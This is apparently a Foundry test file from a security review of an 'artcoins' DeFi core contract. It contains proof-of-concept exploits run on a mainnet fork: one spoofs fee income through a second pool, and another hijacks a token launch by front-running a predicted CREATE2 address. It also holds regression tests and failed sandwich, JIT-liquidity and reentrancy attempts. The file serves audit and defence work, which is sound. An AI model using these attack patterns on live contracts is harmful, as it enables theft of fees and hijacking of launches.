// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {StdStorage, stdStorage} from "forge-std/Test.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Fixture} from "./utils/Fixture.sol";
import {Core} from "../src/Core.sol";
import {ControllerV1} from "../src/ControllerV1.sol";
import {IArtCoinsFactory} from "../src/interfaces/ArtCoins.sol";
import {MockExitToken} from "./standins/MockExitToken.sol";
import {MockExitModule} from "./standins/MockExitModule.sol";
import {Mainnet} from "../src/interfaces/Interfaces.sol";
import {TestSwapRouter} from "./utils/TestSwapRouter.sol";
import {TestLiquidityHelper} from "./utils/TestLiquidityHelper.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {FullMath} from "v4-core/src/libraries/FullMath.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";

interface IHookOpen {
    function initializePoolOpen(address artCoin, address paired, int24 tick, int24 spacing, bytes calldata poolData)
        external
        returns (PoolKey memory);
}

/// independent review of the artcoins port. `test_POC_*` prove a finding on the pinned fork, `test_held_*` are
/// attacks that failed. every number quoted in docs/REVIEW-port.md comes from a log line in this file.
/// a plain receive only bounty recipient, which the hook's `streamForward` probe survives
contract Sink {
    receive() external payable {}
}

/// swaps once in the real pool from inside the eth callback of a core payout, so the hook pushes its bounty into
/// the core while the core is in the middle of a door
contract SwapOnReceive {
    TestSwapRouter public immutable router;
    PoolKey internal key;
    uint256 public swapEth;
    bool public fired;

    constructor(TestSwapRouter router_, PoolKey memory key_) {
        router = router_;
        key = key_;
    }

    function arm(uint256 eth) external {
        swapEth = eth;
        fired = false;
    }

    function sell(Core c, uint256[] calldata ids) external {
        c.sellForEth(ids);
    }

    function compose(Core c) external {
        c.compose();
    }

    function buy(Core c, uint256 sid, uint256 pay) external {
        c.buyStatement{value: pay}(sid);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {
        if (swapEth != 0 && !fired) {
            fired = true;
            router.swap{value: swapEth}(key, true, -int256(swapEth), address(this));
        }
    }
}

contract ReviewPort is Fixture {
    using stdStorage for StdStorage;

    address internal attacker;

    function setUp() public override {
        super.setUp();
        attacker = _user("attacker");
    }

    // ------------------------------------------------------------------ helpers

    function _forceBuyback(uint256 eth) internal {
        vm.deal(address(core), address(core).balance + eth);
        uint256 slot = stdstore.target(address(core)).sig("ethToBuyback()").find();
        vm.store(address(core), bytes32(slot), bytes32(core.ethToBuyback() + eth));
    }

    function _stockPool() internal {
        _skipSniperWindow();
        _buyCoin(_user("trader"), 20 ether);
    }

    function _openPool(address bountyTo, uint24 baseline, int24 spacing) internal returns (PoolKey memory k) {
        bytes memory feeData =
            abi.encode(baseline, uint16(9999), uint24(0), uint24(0), bountyTo, creator, address(core), address(0));
        k = IHookOpen(Mainnet.SKIM_HOOK)
            .initializePoolOpen(address(coin), address(0), -60_000, spacing, abi.encode(address(0), bytes(""), feeData));
    }

    // ------------------------------------------------------------------ P-1 open pool spoofs fee income (donation)

    /// anyone can open a second pool of the coin on the live hook and name the core as its bounty recipient. the
    /// hook then pushes eth to `receive()` with msg.sender == hook, and the core books it as fee income
    function test_POC_openPoolSpoofsFeeIncome() public {
        _stockPool();
        uint64 fillBefore = core.lastFillTime();
        vm.prank(attacker);
        PoolKey memory k = _openPool(address(core), 50_000, 60);
        _buyCoin(attacker, 2 ether);
        TestLiquidityHelper lp = new TestLiquidityHelper();
        vm.startPrank(attacker);
        coin.approve(address(lp), type(uint256).max);
        lp.modify(k, 0, 60_000, 1e18);
        vm.stopPrank();
        vm.deal(attacker, 1 ether);
        uint256 potBefore = core.ethPot();
        vm.prank(attacker);
        router.swap{value: 0.001 ether}(k, true, -int256(0.001 ether), attacker);
        uint256 booked = core.ethPot() - potBefore;
        emit log_named_uint("eth the attacker paid in the open pool", 0.001 ether);
        emit log_named_uint("eth booked into the core pot by the spoof", booked);
        assertGt(booked, 0.0004 ether, "open pool skim was booked as fee income");
        assertEq(core.lastFillTime(), fillBefore, "no fill time change");
        assertLe(core.ethPot() + core.ethToBuyback(), address(core).balance, "solvent");
    }

    // ------------------------------------------------------------------ held: sandwich and jit liquidity on the 1 eth slice

    function _burnOneSlice() internal returns (uint256 burned) {
        vm.roll(block.number + 30);
        uint256 supply = coin.totalSupply();
        vm.prank(keeper);
        core.buyback();
        burned = supply - coin.totalSupply();
    }

    function _sandwich(uint256 x) internal returns (int256 pnl, uint256 burnedAttacked, uint256 potGain) {
        vm.deal(attacker, x);
        vm.prank(attacker);
        router.swap{value: x}(launchKey, true, -int256(x), attacker);
        uint256 coinGot = coin.balanceOf(attacker);
        uint256 pot0 = core.ethPot();
        burnedAttacked = _burnOneSlice();
        potGain = core.ethPot() - pot0;
        uint256 out = _sellCoin(attacker, coinGot);
        pnl = int256(out) - int256(x);
    }

    function test_held_sandwichLosesToTheSkim() public {
        _stockPool();
        _forceBuyback(1 ether);
        uint256 snap = vm.snapshotState();
        uint256 base = _burnOneSlice();
        emit log_named_uint("coin burned by one slice, no attacker", base);
        vm.revertToState(snap);
        uint256[3] memory xs = [uint256(5 ether), 20 ether, 100 ether];
        for (uint256 i; i < 3; ++i) {
            snap = vm.snapshotState();
            (int256 pnl, uint256 burned, uint256 gain) = _sandwich(xs[i]);
            emit log_named_uint("front run eth", xs[i]);
            emit log_named_int("attacker net eth", pnl);
            emit log_named_uint("coin burned for the core", burned);
            emit log_named_uint("pot gain during buyback", gain);
            assertLt(pnl, 0, "sandwich loses");
            vm.revertToState(snap);
        }
    }

    function _spot() internal view returns (uint256 coinPerEthWad, int24 tick) {
        (uint160 sqrtP, int24 t,,) = StateLibrary.getSlot0(PM, launchKey.toId());
        coinPerEthWad = FullMath.mulDiv(FullMath.mulDiv(sqrtP, sqrtP, 1 << 64), 1e18, 1 << 128);
        tick = t;
    }

    /// a just in time position straddling the price for the buyback only deepens the book at the market price
    function test_held_jitLiquidityDoesNotCheapenTheSlice() public {
        _stockPool();
        _forceBuyback(1 ether);
        uint256 snap = vm.snapshotState();
        uint256 base = _burnOneSlice();
        vm.revertToState(snap);

        (, int24 tick) = _spot();
        int24 lo = (tick / 200) * 200 - 400;
        int24 hi = lo + 1200;
        TestLiquidityHelper lp = new TestLiquidityHelper();
        vm.deal(attacker, 1000 ether);
        deal(address(coin), attacker, 2e27);
        vm.startPrank(attacker);
        coin.approve(address(lp), type(uint256).max);
        BalanceDelta added = lp.modify{value: 500 ether}(launchKey, lo, hi, 4e24);
        vm.stopPrank();
        uint256 burned = _burnOneSlice();
        vm.prank(attacker);
        BalanceDelta removed = lp.modify(launchKey, lo, hi, -4e24);
        (uint256 px,) = _spot();
        int256 dEth = int256(removed.amount0()) + int256(added.amount0());
        int256 dCoin = int256(removed.amount1()) + int256(added.amount1());
        int256 valueEth = dEth + dCoin * 1e18 / int256(px);
        emit log_named_uint("burned, no lp", base);
        emit log_named_uint("burned, with jit lp", burned);
        emit log_named_int("lp eth delta", dEth);
        emit log_named_int("lp coin delta", dCoin);
        emit log_named_int("lp value delta in eth at the final price", valueEth);
        assertGe(burned, base, "the core never gets less coin for the slice");
        assertLe(valueEth, 0, "the lp does not gain");
    }

    // ------------------------------------------------------------------ P-2 exit auction: stale clock prices injected funds

    function _composeNext() internal returns (uint256 sid) {
        _fillEthPile(80);
        vm.prank(keeper);
        core.compose();
        sid = STATEMENTS.supply();
    }

    function _take(address who) internal returns (uint256 slice, uint256 coinIn) {
        (slice, coinIn) = core.exitAuctionQuote();
        vm.startPrank(who);
        coin.approve(address(core), type(uint256).max);
        core.buybackExit(type(uint256).max);
        vm.stopPrank();
    }

    /// regression for P-2. the clock used to restart only at an exactly empty pot, so an unsold remainder carried a
    /// decayed clock into injected funds. every injection now re anchors the curve at max(price now, start / 4) and
    /// restarts the clock, so the two arms price the injected slice the same
    function test_FIXED_staleClockNoLongerPricesInjectedFunds() public {
        _enterPhase2();
        _stockPool();
        Composed memory c1 = _composeOnce();
        uint256 sid2 = _composeNext();
        address taker = _user("taker");
        _buyCoin(taker, 5 ether);
        vm.warp(block.timestamp + 72 hours);
        core.exitStatement(c1.sid);
        uint256 full = 20 * core.AVG_SCORE() * core.unitPerPoint();
        emit log_named_uint("xToBuyback after first exit, in slices x1000", core.xToBuyback() * 1000 / full);
        // the taker takes one full slice at an honest decayed price and the remainder stays unsold
        vm.warp(block.timestamp + 200 hours);
        _take(taker);
        uint256 remainder = core.xToBuyback();
        emit log_named_uint("remainder left, in slices x1000", remainder * 1000 / full);
        assertGt(remainder, 0);
        assertLt(remainder, full);
        uint256 snap = vm.snapshotState();

        // arm A: the remainder stays unsold, a matured statement is exited by anyone much later
        vm.warp(block.timestamp + 400 hours);
        uint256 startBefore = core.xStartPrice();
        assertLt(core.exitAuctionPrice(), startBefore / 1e6, "the leftover price decayed far below its start");
        core.exitStatement(sid2);
        assertEq(core.xStartTime(), block.timestamp, "the injection restarted the clock");
        assertEq(core.xStartPrice(), startBefore / 4, "the curve re anchored at the quarter floor");
        (uint256 sliceA, uint256 coinA) = core.exitAuctionQuote();
        emit log_named_uint("arm A: slice", sliceA);
        emit log_named_uint("arm A: coin the taker burns for a full slice", coinA);
        vm.revertToState(snap);

        // arm B: the remainder is sold first, so the pot hits zero and the injection restarts the clock
        vm.warp(block.timestamp + 400 hours);
        _take(taker);
        assertEq(core.xToBuyback(), 0);
        core.exitStatement(sid2);
        (uint256 sliceB, uint256 coinB) = core.exitAuctionQuote();
        emit log_named_uint("arm B: slice", sliceB);
        emit log_named_uint("arm B: coin the taker would burn for a full slice", coinB);
        assertEq(sliceA, sliceB, "same slice");
        assertEq(coinA, coinB, "injected funds are priced the same with or without a leftover remainder");
        assertGt(coinA, 1e24, "no longer sold at the stale decayed price");
    }

    // ------------------------------------------------------------------ P-3 opening price has no floor of precision

    function _phase2With(uint256 unit) internal {
        xt = new MockExitToken("Exit Token", "XT");
        mod = new MockExitModule(address(xt), unit);
        _timelock(Core.Action.SetExitModule, abi.encode(address(mod)));
    }

    function _setExitModuleReverts(uint256 unit) internal {
        xt = new MockExitToken("Exit Token", "XT");
        mod = new MockExitModule(address(xt), unit);
        bytes memory data = abi.encode(address(mod));
        vm.startPrank(owner);
        core.queue(Core.Action.SetExitModule, data);
        vm.warp(block.timestamp + 7 days);
        vm.expectRevert(Core.BadModule.selector);
        core.execute(Core.Action.SetExitModule, data);
        vm.stopPrank();
    }

    /// regressions for P-3. the opening price is `SUPPLY * 1e18 / (20 * AVG_SCORE * unit)`. it was zero above unit
    /// 1.15e37 and 11 at 1e36. setting the module now reverts `BadModule` when it is below 1e12
    function test_FIXED_hugeUnitIsRejectedAtSetTime() public {
        _setExitModuleReverts(2e37);
        assertEq(core.exitModule(), address(0));
    }

    function test_FIXED_largeUnitIsRejectedAtSetTime() public {
        _setExitModuleReverts(1e36);
        assertEq(core.exitModule(), address(0));
    }

    function test_FIXED_unitAtTheBoundaryStillWorks() public {
        _phase2With(1e25);
        assertGe(core.xStartPrice(), 1e12);
    }

    // ------------------------------------------------------------------ P-5 forbidden targets

    /// regression for P-5: permit2, the v4 position manager and the universal router cannot become targets
    function test_FIXED_permit2AndRoutersAreForbiddenTargets() public {
        address[3] memory banned = [Mainnet.PERMIT2, Mainnet.POSITION_MANAGER, Mainnet.UNIVERSAL_ROUTER];
        for (uint256 i; i < banned.length; ++i) {
            bytes memory data = abi.encode(banned[i]);
            vm.startPrank(owner);
            core.queue(Core.Action.AddTarget, data);
            vm.warp(block.timestamp + 7 days);
            vm.expectRevert(Core.ForbiddenTarget.selector);
            core.execute(Core.Action.AddTarget, data);
            vm.stopPrank();
            assertFalse(core.allowedTarget(banned[i]));
        }
    }

    // ------------------------------------------------------------------ P-4 launch hijack of the predicted coin (artcoins T-1)

    /// once the factory is open (`deprecated` false) anyone who sees the launch can copy the token and tax config,
    /// keep the predicted coin address and put their own bounty recipient in the pool. the core is already deployed
    /// against that address (immutable), so it is bound for good to a pool that never pays it
    function test_POC_launchHijackLeavesTheCoreDeadAgainstTheCoin() public {
        vm.prank(Mainnet.ARTCOINS_FACTORY_OWNER);
        (bool ok,) = Mainnet.ARTCOINS_FACTORY.call(abi.encodeWithSignature("setDeprecated(bool)", false));
        assertTrue(ok);
        bytes32 salt = keccak256("hijack victim");
        uint64 nonce = vm.getNonce(deployer);
        address coreAt = vm.computeCreateAddress(deployer, nonce + 1);
        address coinAt = predictCoin(deployer, coreAt, "Victim", "VIC", salt);
        vm.startPrank(deployer);
        ControllerV1 c2 = new ControllerV1(coreAt);
        Core core2 = new Core(owner, coinAt, address(c2));
        vm.stopPrank();
        assertEq(address(core2), coreAt);

        // the attacker copies tokenConfig and taxConfig from the mempool and names itself in the pool
        vm.deal(attacker, 1 ether);
        address sink = address(new Sink());
        vm.prank(attacker);
        address got = FACTORY.deployTokenWithProtocolBpsAndTax{value: FACTORY.deployFee()}(
            buildConfig(deployer, sink, attacker, "Victim", "VIC", salt), 0, buildTaxConfig(coreAt)
        );
        assertEq(got, coinAt, "the attacker got the predicted coin address");

        // the real launch now reverts on the CREATE2 collision
        vm.deal(deployer, 1 ether);
        uint256 fee = FACTORY.deployFee();
        IArtCoinsFactory.DeploymentConfig memory cfg = buildConfig(deployer, coreAt, creator, "Victim", "VIC", salt);
        IArtCoinsFactory.TaxConfig memory tax = buildTaxConfig(coreAt);
        vm.prank(deployer);
        vm.expectRevert();
        FACTORY.deployTokenWithProtocolBpsAndTax{value: fee}(cfg, 0, tax);

        // trading starts: every skim point goes to the attacker, the core gets nothing and cannot rebind
        vm.warp(block.timestamp + SNIPER_WINDOW + 1);
        PoolKey memory key = poolKeyOf(coinAt);
        address buyer = _user("buyer");
        vm.deal(buyer, 10 ether);
        vm.prank(buyer);
        router.swap{value: 1 ether}(key, true, -1 ether, buyer);
        emit log_named_uint("eth skim pushed to the attacker sink on a 1 eth buy", sink.balance);
        emit log_named_uint("eth the victim core received", address(core2).balance);
        assertGt(sink.balance, 0.09 ether);
        assertEq(address(core2).balance, 0);
        assertEq(core2.COIN(), coinAt);
    }

    // ------------------------------------------------------------------ held: hook push inside the core's own payouts

    function _assertClean(string memory what) internal view {
        assertEq(address(core).balance, core.ethPot() + core.ethToBuyback(), what);
    }

    /// a swap fired from the eth callback of a sell payout, a compose reimbursement and a statement refund. the
    /// hook pushes into `receive()` mid door, it is booked in full, and the books stay exact
    function test_held_swapInsidePayoutCallbacks() public {
        _stockPool();
        SwapOnReceive actor = new SwapOnReceive(router, launchKey);
        vm.deal(address(actor), 50 ether);
        _fundPot(2 ether);
        _assertClean("start");

        uint256[] memory ids = _credits(address(actor), 80);
        vm.warp(block.timestamp + 40 hours);
        actor.arm(1 ether);
        uint256 pot0 = core.ethPot();
        actor.sell(core, _slice(ids, 0, 3));
        assertTrue(actor.fired(), "swap fired inside the payout");
        assertGt(core.ethPot(), pot0 - 1 ether, "bounty booked");
        _assertClean("after sell");

        uint256 sidBase = STATEMENTS.supply();
        _fillEthPile(80);
        vm.fee(0.2 gwei);
        actor.arm(1 ether);
        uint256 potC = core.ethPot();
        actor.compose(core);
        assertTrue(actor.fired(), "swap fired inside the reimbursement");
        assertGt(STATEMENTS.supply(), sidBase);
        assertGt(core.ethPot(), potC - 1, "bounty booked");
        _assertClean("after compose");

        uint256 sid = STATEMENTS.supply();
        uint256 price = core.priceOf(sid);
        actor.arm(1 ether);
        uint256 potB = core.ethPot();
        actor.buy(core, sid, price + 3 ether);
        assertTrue(actor.fired(), "swap fired inside the refund");
        assertGt(core.ethPot(), potB, "bounty and sale booked");
        _assertClean("after statement refund");
    }

    function _slice(uint256[] memory a, uint256 from, uint256 n) internal pure returns (uint256[] memory r) {
        r = new uint256[](n);
        for (uint256 i; i < n; ++i) {
            r[i] = a[from + i];
        }
    }
}
